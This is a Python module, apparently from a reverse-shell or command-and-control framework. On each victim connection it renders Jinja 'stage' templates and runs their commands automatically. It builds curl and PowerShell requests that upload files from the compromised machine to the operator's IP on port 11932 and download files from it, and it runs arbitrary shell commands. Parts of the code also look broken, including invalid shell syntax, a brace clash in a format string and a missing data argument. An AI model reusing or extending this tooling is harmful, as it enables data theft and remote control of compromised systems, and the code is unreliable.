from jinja2 import Environment, FileSystemLoader
from core.printl import *
import os
import sys

env = Environment(loader=FileSystemLoader('./stages'))
ip = sys.argv[1]

def parse(line, shell, stgName=None, data=None):
    line = line.strip()

    try:
        command, args = line.split(" ", 1)
    except:
        return

    if command in ["run", "exec", "execute"]:
        shell(args)
    elif command in ["upload", "up"]:
        command = "curl -X POST -H \"Content-Type: multipart/form-data\" -H \"filename: {}\" -H \"Authorization: {}\" -T \"{}\" \"http://{}:{}/\"".format(os.path.basename(args), data["uuid"], args, ip, 11932)

        if data["os"] == "Windows":
            if data["shelltype"] == "command prompt":
                command = "start cmd.exe /C "+command+" && echo 1"
            elif data["shelltype"] == "powershell":
                command = "Invoke-RestMethod -Uri 'http://{}:{}/' -Method Post -Headers @{ 'Content-Type' = 'multipart/form-data'; 'filename' = '{}'; 'Authorization' = '{}' } -InFile '{}'; echo 1".format(ip, 11932, os.path.basename(args), data["uuid"], args)
        else:
            command = "nohup " + command + " & && echo 1"

        shell(command)
    elif command in ["download", "dl"]:
        command = "curl -H \"Authorization: {}\" \"http://{}:{}/\" -o {}".format(data["uuid"], ip, 11932, os.path.join("./", os.path.basename(args)))

        shell(command)
    elif command in ["print", "echo"]:
        info("[STAGE {}] {}".format(stgName, args))

def onConnection(data, shell):
    for stage in os.listdir("./stages"):

        with open("./stages/{}".format(stage), "r") as f:
            if "#ar" not in f.readlines()[0]:
                continue

        template = env.get_template(stage)

        info("gave variables '{}' to stage \"{}\"".format(data, stage))
        
        output = template.render(data).split("\n")

        for line in output:
            line = line.strip()
            if len(line) != 0:
                parse(line, shell, stgName=stage)

def runStage(stage, data, shell):
    if stage not in os.listdir("./stages"):
        return False
    
    template = env.get_template(stage)
    output = template.render(data).split("\n")

    for line in output:
        line = line.strip()
        if len(line) != 0:
            parse(line, shell, stgName=stage, data=data)